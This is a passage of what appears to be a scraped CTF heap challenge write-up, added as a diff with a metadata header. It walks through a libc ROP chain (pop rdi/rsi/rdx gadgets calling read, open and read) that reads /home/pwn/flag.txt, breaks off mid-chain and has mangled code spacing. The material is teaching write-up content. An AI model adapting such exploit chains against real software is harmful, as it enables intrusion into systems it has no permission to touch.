@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://qudah.dev/blog/0xfun-heap-writeup/
+CHALLENGE: CTF heap challenge writeup
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: rop_chain
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: read
+KEY_TECHNIQUE: Writeup for CTF heap challenge writeup — rop_chain exploitation technique.
+---
+ open(address_of_memory_region_that_contains_path_to_flag, 0) read(3, memory_region_to_write_flag_content_to, 0x100) # 3 will be the fd for the file we open write(1, memory_region_to_write_flag_content_to, 0x100) There is no memory region that contains /home/pwn/flag.txt (the flag path) by default, we need to write it ourself. I always use the bss region in libc to dynamically write data in my exploits: I can make my ROP chain read from stdin into libc.bss , and make my script send another line which contains the path. # where to read file path path = libc. bss () # where to read file contents data = libc. bss () menu ( " edit " , b " 7 " , flat ({ 0x18 : [ #" read path" # read(0, bss, 20) p64 (libc.address + 0x102dea ), # pop rdi p64 ( 0 ), p64 (libc.address + 0x53847 ), # pop rsi p64 (path), p64 (libc.address + 0xd77bd ), # pop rdx p64 ( 0x20 ), p64 (libc.symbols [ ' read ' ] ), # <--- this will block waiting for input from stdin # at this point, the memory region in `path` contains /home/pwn/flag.txt #" open file" # open(path, 0) p64 (libc.address + 0x102dea ), # pop rdi p64 (path), p64 (libc.address + 0x53847 ), # pop rsi p64 ( 0 ), p64 (libc.symbols [ ' open ' ] ), ... ] })) time. sleep ( 1 ) p. send ( b " /home/pwn/flag.txt \x00 " ) # this will be written in libc.bss Now, I'll just do a simple open-read-write. """ Full chain """ # where to read file path path = libc. bss () # where to read file contents data = libc. bss () menu ( " edit " , b " 7 " , flat ({ 0x18 : [ #" read path" # read(0, bss, 20) p64 (libc.address + 0x102dea ), # pop rdi p64 ( 0 ), p64 (libc.address + 0x53847 ), # pop rsi p64 (path), p64 (libc.address + 0xd77bd ), # pop rdx p64 ( 0x20 ), p64 (libc.symbols [ ' read ' ] ), #" open file" # open(path, 0) p64 (libc.address + 0x102dea ), # pop rdi p64 (path), p64 (libc.address + 0x53847 ), # pop rsi p64 ( 0 ), p64 (libc.symbols [ ' open ' ] ), #" read flag" # read(3, bss, 20) p64 (libc.address + 0x102dea ), # pop rdi p64 ( 3 ), p64 (libc.address 
